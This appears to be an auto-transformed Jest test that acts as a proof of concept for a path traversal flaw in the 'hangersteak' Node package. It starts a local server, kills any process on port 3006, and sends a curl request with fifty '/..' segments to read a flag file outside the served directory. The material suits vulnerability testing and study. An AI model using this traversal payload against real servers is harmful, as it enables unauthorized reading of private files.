const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v19 = '/..'.repeat(50);
    const v20 = v19 + pathToFlag;
    return v20;
};
const v35 = done => {
    const v21 = expect.assertions(1);
    v21;
    const http = require('http');
    const hangersteak = require('hangersteak');
    const fs = require('fs');
    const v22 = require('child_process');
    const exec = v22.exec;
    const v23 = fs.readFileSync(pathToFlag);
    let hostsFile = v23.toString();
    const a = require('child_process');
    try {
        const v24 = () => {
        };
        const v25 = a.execSync('fuser -k 3006/tcp', v24);
        v25;
    } catch (e) {
    }
    const v27 = (req, res) => {
        const v26 = hangersteak(req, res);
        v26;
    };
    const server = http.createServer(v27);
    const v28 = server.listen(3006);
    v28;
    const v29 = genstr();
    let attack_string = `curl -v --path-as-is "http://localhost:3006${ v29 }"`;
    const v33 = (error, stdout) => {
        const v30 = expect(stdout);
        const v31 = v30.toBe(hostsFile);
        v31;
        const v32 = done();
        v32;
    };
    const v34 = exec(attack_string, v33);
    v34;
};
const v36 = test('Path Traversal in hangersteak', v35);
v36;